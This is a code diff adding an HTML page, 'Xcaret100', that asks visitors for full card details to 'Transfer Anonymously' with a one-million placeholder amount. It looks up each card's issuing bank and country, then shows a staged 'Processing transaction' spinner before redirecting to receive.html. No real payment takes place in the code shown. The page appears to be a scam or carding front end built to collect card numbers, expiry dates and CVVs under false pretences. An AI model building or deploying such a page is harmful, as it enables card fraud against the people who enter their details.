@@ -1,0 +1,796 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Xcaret100</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background-color: #f0f0f0;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+        }
+
+        .container {
+            max-width: 480px;
+            width: 100%;
+            background: #ffffff;
+            min-height: 100vh;
+        }
+
+        .header {
+            width: 100%;
+            background-color: #000000;
+            color: #ffffff;
+            display: flex;
+            align-items: center;
+            padding: 14px 16px;
+        }
+
+        .header .back-arrow {
+            font-size: 22px;
+            cursor: pointer;
+            margin-right: 18px;
+            text-decoration: none;
+            color: #ffffff;
+        }
+
+        .header .title {
+            font-size: 18px;
+            font-weight: 400;
+        }
+
+        .payment-banner {
+            background: #ffffff;
+            border: 1.5px solid #d0d0d0;
+            border-radius: 30px;
+            margin: 12px 16px;
+            padding: 12px 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 14px;
+        }
+
+        .payment-banner .card-logo {
+            height: 32px;
+            object-fit: contain;
+        }
+
+        .card-icon-svg {
+            width: 44px;
+            height: 30px;
+        }
+
+        .divider-bar {
+            width: 2px;
+            height: 28px;
+            background: #999;
+        }
+
+        .amex-logo {
+            background: #006FCF;
+            color: white;
+            font-size: 11px;
+            font-weight: 900;
+            padding: 4px 6px;
+            border-radius: 3px;
+            line-height: 1.1;
+            text-align: center;
+            font-family: Arial, sans-serif;
+        }
+
+        .amex-logo span {
+            display: block;
+            font-size: 10px;
+        }
+
+        .discover-logo {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            line-height: 1;
+        }
+
+        .discover-logo .disc-text {
+            font-size: 11px;
+            font-weight: 900;
+            color: #000;
+            letter-spacing: 0.5px;
+        }
+
+        .discover-logo .over-text {
+            font-size: 9px;
+            font-weight: 700;
+            color: #ff6600;
+            letter-spacing: 0.3px;
+        }
+
+        .mc-logo {
+            display: flex;
+            align-items: center;
+            gap: 0;
+        }
+
+        .mc-circle-red {
+            width: 22px;
+            height: 22px;
+            background: #eb001b;
+            border-radius: 50%;
+        }
+
+        .mc-circle-orange {
+            width: 22px;
+            height: 22px;
+            background: #f79e1b;
+            border-radius: 50%;
+            margin-left: -8px;
+            opacity: 0.85;
+        }
+
+        .visa-logo {
+            font-size: 22px;
+            font-weight: 900;
+            color: #1a1f71;
+            font-style: italic;
+            font-family: Arial, sans-serif;
+            letter-spacing: 1px;
+        }
+
+        .main-title {
+            background: #000000;
+            color: #ffffff;
+            padding: 22px 20px;
+            text-align: center;
+            font-size: 21px;
+            font-weight: 700;
+            line-height: 1.4;
+        }
+
+        .subtitle-bar {
+            background: #f2f2f2;
+            color: #333333;
+            padding: 12px 20px;
+            font-size: 14px;
+            border-bottom: 1px solid #e8e8e8;
+        }
+
+        .form-container {
+            padding: 20px 20px 40px 20px;
+            background: #ffffff;
+        }
+
+        .form-group {
+            margin-bottom: 22px;
+        }
+
+        .form-group label {
+            display: block;
+            font-size: 17px;
+            font-weight: 700;
+            color: #000000;
+            margin-bottom: 8px;
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 8px 0;
+            font-size: 16px;
+            border: none;
+            border-bottom: 1.5px solid #8ab4c7;
+            outline: none;
+            background: transparent;
+            font-family: inherit;
+            color: #333;
+        }
+
+        .form-group input::placeholder {
+            color: #999999;
+        }
+
+        .form-group input:focus {
+            border-bottom: 2px solid #5a9fb5;
+        }
+
+        .card-number-wrapper {
+            position: relative;
+        }
+
+        .card-number-wrapper input {
+            padding-right: 70px;
+        }
+
+        .detected-card-icon {
+            position: absolute;
+            right: 0;
+            bottom: 8px;
+            width: 55px;
+            height: 36px;
+            background-size: contain;
+            background-repeat: no-repeat;
+            background-position: center;
+            opacity: 0;
+            transition: opacity 0.3s ease;
+        }
+
+        .detected-card-icon.show {
+            opacity: 1;
+        }
+
+        .detected-card-icon.visa {
+            background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 60 38"><text x="30" y="27" text-anchor="middle" fill="%231A1F71" font-size="22" font-weight="900" font-style="italic" font-family="Arial">VISA</text></svg>');
+        }
+
+        .detected-card-icon.mastercard {
+            background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 60 38"><circle cx="22" cy="19" r="12" fill="%23eb001b"/><circle cx="38" cy="19" r="12" fill="%23f79e1b" opacity="0.85"/></svg>');
+        }
+
+        .detected-card-icon.amex {
+            background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 60 38"><rect width="60" height="38" rx="4" fill="%23006FCF"/><text x="30" y="24" text-anchor="middle" fill="white" font-size="14" font-weight="900" font-family="Arial">AMEX</text></svg>');
+        }
+
+        .detected-card-icon.discover {
+            background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 60 38"><rect width="60" height="38" rx="4" fill="white" stroke="%23ddd" stroke-width="1"/><text x="30" y="18" text-anchor="middle" fill="%23000" font-size="10" font-weight="900" font-family="Arial">DISC</text><text x="30" y="30" text-anchor="middle" fill="%23ff6600" font-size="9" font-weight="700" font-family="Arial">OVER</text></svg>');
+        }
+
+        .detected-card-icon.jcb {
+            background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 60 38"><rect width="60" height="38" rx="4" fill="white" stroke="%23ddd" stroke-width="1"/><text x="30" y="25" text-anchor="middle" fill="%230079C2" font-size="14" font-weight="900" font-family="Arial">JCB</text></svg>');
+        }
+
+        .detected-card-icon.diners {
+            background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 60 38"><rect width="60" height="38" rx="4" fill="white" stroke="%23ddd" stroke-width="1"/><text x="30" y="25" text-anchor="middle" fill="%23004B8D" font-size="10" font-weight="900" font-family="Arial">DINERS</text></svg>');
+        }
+
+        .detected-card-icon.unionpay {
+            background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 60 38"><rect width="60" height="38" rx="4" fill="white" stroke="%23ddd" stroke-width="1"/><text x="30" y="25" text-anchor="middle" fill="%23E21836" font-size="9" font-weight="900" font-family="Arial">UNIONPAY</text></svg>');
+        }
+
+        .expiry-row {
+            display: flex;
+            gap: 30px;
+            margin-top: 4px;
+        }
+
+        .expiry-row .expiry-input {
+            flex: 1;
+        }
+
+        .expiry-row input {
+            width: 100%;
+            padding: 8px 0;
+            font-size: 16px;
+            border: none;
+            border-bottom: 1.5px solid #8ab4c7;
+            outline: none;
+            background: transparent;
+            font-family: inherit;
+            font-style: italic;
+            color: #999;
+        }
+
+        .expiry-row input::placeholder {
+            color: #999999;
+            font-style: italic;
+        }
+
+        .expiry-row input:focus {
+            border-bottom: 2px solid #5a9fb5;
+        }
+
+        .cvv-header {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .what-is-this {
+            color: #4a90d9;
+            font-size: 14px;
+            cursor: pointer;
+            text-decoration: none;
+            font-weight: 400;
+        }
+
+        .what-is-this:hover {
+            text-decoration: underline;
+        }
+
+        .cvv-input-wrapper {
+            margin-top: 8px;
+        }
+
+        .cvv-input-wrapper input {
+            width: 100px;
+            padding: 8px 0;
+            font-size: 16px;
+            border: none;
+            border-bottom: 1.5px solid #8ab4c7;
+            outline: none;
+            background: transparent;
+            font-family: inherit;
+            color: #333;
+        }
+
+        .cvv-input-wrapper input::placeholder {
+            color: #999999;
+        }
+
+        .cvv-input-wrapper input:focus {
+            border-bottom: 2px solid #5a9fb5;
+        }
+
+        .proceed-btn {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+            margin: 30px auto 0 auto;
+            padding: 16px 50px;
+            background: #4a9fe5;
+            color: #ffffff;
+            border: none;
+            border-radius: 4px;
+            font-size: 22px;
+            font-weight: 700;
+            cursor: pointer;
+            letter-spacing: 1px;
+            box-shadow: 0 2px 6px rgba(0,0,0,0.15);
+        }
+
+        .proceed-btn:hover {
+            background: #3a8fd5;
+        }
+
+        .proceed-btn:active {
+            background: #2a7fc5;
+        }
+
+        .lock-emoji {
+            font-size: 24px;
+        }
+
+        .bin-info {
+            margin-top: 8px;
+            padding: 8px 12px;
+            background: #f8f9fa;
+            border-radius: 6px;
+            font-size: 13px;
+            color: #555;
+            display: none;
+        }
+
+        .bin-info.show {
+            display: block;
+        }
+
+        .bin-info .bin-label {
+            font-weight: 600;
+            color: #333;
+        }
+
+        .bin-info .bin-value {
+            color: #1a73e8;
+            font-weight: 600;
+        }
+
+        /* Modal Styles */
+        .modal-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.7);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+        }
+
+        .modal-content {
+            background: white;
+            border-radius: 12px;
+            width: 90%;
+            max-width: 400px;
+            padding: 20px;
+            position: relative;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.3);
+        }
+
+        .modal-close {
+            position: absolute;
+            top: 12px;
+            right: 16px;
+            font-size: 24px;
+            cursor: pointer;
+            color: #666;
+            font-weight: bold;
+        }
+
+        .modal-image {
+            width: 100%;
+            height: auto;
+            border-radius: 8px;
+            margin: 16px 0;
+        }
+
+        .modal-title {
+            font-size: 18px;
+            font-weight: 700;
+            color: #333;
+            margin-bottom: 12px;
+            text-align: center;
+        }
+
+        .modal-description {
+            font-size: 14px;
+            color: #555;
+            line-height: 1.5;
+            margin-bottom: 20px;
+        }
+
+        /* Loading Spinner Styles */
+        .spinner {
+            width: 50px;
+            height: 50px;
+            border: 4px solid rgba(74, 159, 229, 0.2);
+            border-left-color: #4a9fe5;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        @media (max-width: 480px) {
+            .container {
+                max-width: 100%;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <a href="#" class="back-arrow">&#8592;</a>
+            <span class="title">Xcaret100</span>
+        </div>
+
+        <div class="payment-banner">
+            <svg class="card-icon-svg" viewBox="0 0 44 30" xmlns="http://www.w3.org/2000/svg">
+                <rect x="2" y="2" width="40" height="26" rx="4" fill="none" stroke="#333" stroke-width="2"/>
+                <rect x="2" y="8" width="40" height="8" fill="none" stroke="#333" stroke-width="1.5"/>
+                <path d="M30 20 L36 25 L42 20" fill="none" stroke="#333" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+            </svg>
+            <div class="divider-bar"></div>
+            <div class="amex-logo">AM<span>EX</span></div>
+            <div class="discover-logo">
+                <span class="disc-text">DISC<span style="color:#ff6600">O</span>VER</span>
+            </div>
+            <div class="mc-logo">
+                <div class="mc-circle-red"></div>
+                <div class="mc-circle-orange"></div>
+            </div>
+            <div class="visa-logo">VISA</div>
+        </div>
+
+        <div class="main-title">
+            Enter Card details You Want To Transfer From
+        </div>
+
+        <div class="subtitle-bar">
+            Transfer Anonymously with Credit/Debit Cards
+        </div>
+
+        <div class="form-container">
+            <div class="form-group">
+                <label>Payment Amount</label>
+                <input type="text" placeholder="e.g, 1000000.00" id="amount">
+            </div>
+
+            <div class="form-group">
+                <label>Name on Card</label>
+                <input type="text" placeholder="e.g James Smith" id="cardName">
+            </div>
+
+            <div class="form-group">
+                <label>Card Number</label>
+                <div class="card-number-wrapper">
+                    <input type="text" placeholder="xxxx xxxx xxxx xxxx" id="cardNumber" maxlength="19" autocomplete="off">
+                    <div class="detected-card-icon" id="detectedIcon"></div>
+                </div>
+                <div class="bin-info" id="binInfo">
+                    <span class="bin-label">Card: </span><span class="bin-value" id="binBrand">-</span> &nbsp;|&nbsp;
+                    <span class="bin-label">Bank: </span><span class="bin-value" id="binBank">-</span> &nbsp;|&nbsp;
+                    <span class="bin-label">Country: </span><span class="bin-value" id="binCountry">-</span>
+                </div>
+            </div>
+
+            <div class="form-group">
+                <label>Expiration Date</label>
+                <div class="expiry-row">
+                    <div class="expiry-input">
+                        <input type="text" placeholder="MM" maxlength="2" id="expMonth">
+                    </div>
+                    <div class="expiry-input">
+                        <input type="text" placeholder="YYYY" maxlength="4" id="expYear">
+                    </div>
+                </div>
+            </div>
+
+            <div class="form-group">
+                <div class="cvv-header">
+                    <label style="margin-bottom:0;">CVV/CVC</label>
+                    <a href="#" class="what-is-this" onclick="showCVVModal(); return false;">What is this?</a>
+                </div>
+                <div class="cvv-input-wrapper">
+                    <input type="text" placeholder="xxx" maxlength="4" id="cvv">
+                </div>
+            </div>
+
+            <button class="proceed-btn" onclick="proceed()">
+                <span class="lock-emoji">🔒</span> PROCEED
+            </button>
+        </div>
+    </div>
+
+    <!-- Modal for CVV Help -->
+    <div class="modal-overlay" id="cvvModal">
+        <div class="modal-content">
+            <div class="modal-close" onclick="closeCVVModal()">&#10005;</div>
+            <h3 class="modal-title">What is CVV/CVC?</h3>
+            <p class="modal-description">
+                CVV (Card Verification Value) or CVC (Card Verification Code) is a security code used to verify that you have the physical card during online transactions.
+            </p>
+            <img class="modal-image" src="https://iili.io/Ce2giox.jpg" alt="CVV/CVC Location Guide">
+            <p class="modal-description">
+                • <strong>Visa, Mastercard, Discover:</strong> 3-digit code on the back of your card (right side of signature strip)<br>
+                • <strong>American Express:</strong> 4-digit code on the front of your card (above the card number)
+            </p>
+        </div>
+    </div>
+
+    <!-- Loading Modal -->
+    <div class="modal-overlay" id="loadingModal">
+        <div class="modal-content" style="text-align: center; padding: 40px 20px;">
+            <div class="spinner"></div>
+            <h3 class="modal-title" style="margin-top: 20px;">Processing transaction</h3>
+            <p class="modal-description">Please do not close this window.</p>
+        </div>
+    </div>
+
+    <script>
+        const cardNumberInput = document.getElementById('cardNumber');
+        const detectedIcon = document.getElementById('detectedIcon');
+        const binInfo = document.getElementById('binInfo');
+        const binBrand = document.getElementById('binBrand');
+        const binBank = document.getElementById('binBank');
+        const binCountry = document.getElementById('binCountry');
+        const cvvModal = document.getElementById('cvvModal');
+        const loadingModal = document.getElementById('loadingModal');
+
+        // Card type detection patterns (regex)
+        const cardPatterns = {
+            visa: /^4/,
+            mastercard: /^(5[1-5]|2[2-7])/,
+            amex: /^3[47]/,
+            discover: /^(6011|65|64[4-9]|622(1(2[6-9]|3[0-9])|2(1[2-9]|2[0-9]|3[0-9]|4[0-9]|5[0-9]|6[0-9]|7[0-9]|8[0-9]|9[0-9])|[3-8][0-9]{2}|9([01][0-9]|2[0-9])))$/,
+            jcb: /^35(2[89]|[3-8][0-9])/,
+            diners: /^3(0[0-5]|[68])/,
+            unionpay: /^62/
+        };
+
+        const cardBrandNames = {
+            visa: 'Visa',
+            mastercard: 'Mastercard',
+            amex: 'American Express',
+            discover: 'Discover',
+            jcb: 'JCB',
+            diners: 'Diners Club',
+            unionpay: 'UnionPay'
+        };
+
+        // Format card number with spaces (4-4-4-4)
+        function formatCardNumber(value) {
+            const v = value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
+            const parts = [];
+            for (let i = 0, len = v.length; i < len; i += 4) {
+                parts.push(v.substring(i, i + 4));
+            }
+            return parts.join(' ');
+        }
+
+        // Detect card type from number
+        function detectCardType(cardNumber) {
+            const cleanNumber = cardNumber.replace(/\s/g, '');
+            for (const [type, pattern] of Object.entries(cardPatterns)) {
+                if (pattern.test(cleanNumber)) {
+                    return type;
+                }
+            }
+            return null;
+        }
+
+        // Fetch card details from free BIN API (binlist.net)
+        async function fetchCardDetails(cardNumber) {
+            const bin = cardNumber.replace(/\s/g, '').substring(0, 6);
+            if (bin.length < 6) return null;
+
+            try {
+                const response = await fetch(`https://lookup.binlist.net/${bin}`, {
+                    method: 'GET',
+                    headers: {
+                        'Accept-Version': '3',
+                        'Accept': 'application/json'
+                    }
+                });
+                if (response.ok) {
+                    return await response.json();
+                }
+            } catch (error) {
+                console.error('BIN lookup error:', error);
+            }
+            return null;
+        }
+
+        // Update detected card icon
+        function updateDetectedIcon(cardType) {
+            detectedIcon.className = 'detected-card-icon';
+            if (cardType) {
+                detectedIcon.classList.add(cardType);
+                detectedIcon.classList.add('show');
+            } else {
+                detectedIcon.classList.remove('show');
+            }
+        }
+
+        // Debounce helper
+        function debounce(fn, delay) {
+            let timer;
+            return function(...args) {
+                clearTimeout(timer);
+                timer = setTimeout(() => fn.apply(this, args), delay);
+            };
+        }
+
+        // Handle card number input
+        const handleCardInput = debounce(async (e) => {
+            const value = e.target.value;
+            const formatted = formatCardNumber(value);
+            e.target.value = formatted;
+
+            const cleanNumber = formatted.replace(/\s/g, '');
+            const cardType = detectCardType(cleanNumber);
+
+            // Update icon immediately based on regex
+            updateDetectedIcon(cardType);
+
+            // Fetch BIN details when we have 6+ digits
+            if (cleanNumber.length >= 6) {
+                const details = await fetchCardDetails(cleanNumber);
+                if (details) {
+                    const brand = cardBrandNames[cardType] || details.scheme?.toUpperCase() || 'Unknown';
+                    const bank = details.bank?.name || 'Unknown';
+                    const country = details.country?.name || 'Unknown';
+                    const emoji = details.country?.emoji || '';
+
+                    binBrand.textContent = brand;
+                    binBank.textContent = bank;
+                    binCountry.textContent = `${country} ${emoji}`;
+                    binInfo.classList.add('show');
+                } else {
+                    // Fallback to regex-only detection
+                    if (cardType) {
+                        binBrand.textContent = cardBrandNames[cardType];
+                        binBank.textContent = 'Lookup unavailable';
+                        binCountry.textContent = 'Unknown';
+                        binInfo.classList.add('show');
+                    } else {
+                        binInfo.classList.remove('show');
+                    }
+                }
+            } else {
+                binInfo.classList.remove('show');
+            }
+        }, 300);
+
+        cardNumberInput.addEventListener('input', handleCardInput);
+
+        // Allow only numbers and spaces
+        cardNumberInput.addEventListener('keypress', (e) => {
+            if (!/[0-9\s]/.test(e.key)) {
+                e.preventDefault();
+            }
+        });
+
+        // Format expiry month (MM)
+        document.getElementById('expMonth').addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\D/g, '');
+            if (value.length > 2) value = value.slice(0, 2);
+            if (value.length === 2 && parseInt(value) > 12) value = '12';
+            if (value.length === 1 && parseInt(value) > 1) value = '0' + value;
+            e.target.value = value;
+        });
+
+        // Format expiry year (YYYY)
+        document.getElementById('expYear').addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\D/g, '');
+            if (value.length > 4) value = value.slice(0, 4);
+            e.target.value = value;
+        });
+
+        // Format CVV - only numbers
+        document.getElementById('cvv').addEventListener('input', function(e) {
+            e.target.value = e.target.value.replace(/\D/g, '');
+        });
+
+        // Format amount - only numbers and one decimal
+        document.getElementById('amount').addEventListener('input', function(e) {
+            let value = e.target.value.replace(/[^0-9.]/g, '');
+            const parts = value.split('.');
+            if (parts.length > 2) value = parts[0] + '.' + parts.slice(1).join('');
+            e.target.value = value;
+        });
+
+        // Show CVV modal
+        function showCVVModal() {
+            cvvModal.style.display = 'flex';
+            document.body.style.overflow = 'hidden';
+        }
+
+        // Close CVV modal
+        function closeCVVModal() {
+            cvvModal.style.display = 'none';
+            document.body.style.overflow = 'auto';
+        }
+
+        // Close modal when clicking outside
+        cvvModal.addEventListener('click', function(e) {
+            if (e.target === this) {
+                closeCVVModal();
+            }
+        });
+
+        // Proceed button
+        function proceed() {
+            const amount = document.getElementById('amount').value;
+            const cardName = document.getElementById('cardName').value;
+            const cardNumber = document.getElementById('cardNumber').value;
+            const expMonth = document.getElementById('expMonth').value;
+            const expYear = document.getElementById('expYear').value;
+            const cvv = document.getElementById('cvv').value;
+
+            if (!amount || !cardName || !cardNumber || !expMonth || !expYear || !cvv) {
+                alert('Please fill in all fields');
+                return;
+            }
+
+            const cleanNum = cardNumber.replace(/\s/g, '');
+            if (cleanNum.length < 15) {
+                alert('Please enter a valid card number');
+                return;
+            }
+
+            // Show loading modal
+            loadingModal.style.display = 'flex';
+            document.body.style.overflow = 'hidden';
+
+            // Redirect to receive.html after 5 seconds
+            setTimeout(function() {
+                window.location.href = 'receive.html';
+            }, 5000);
+        }
+    </script>
+</body>
+</html>
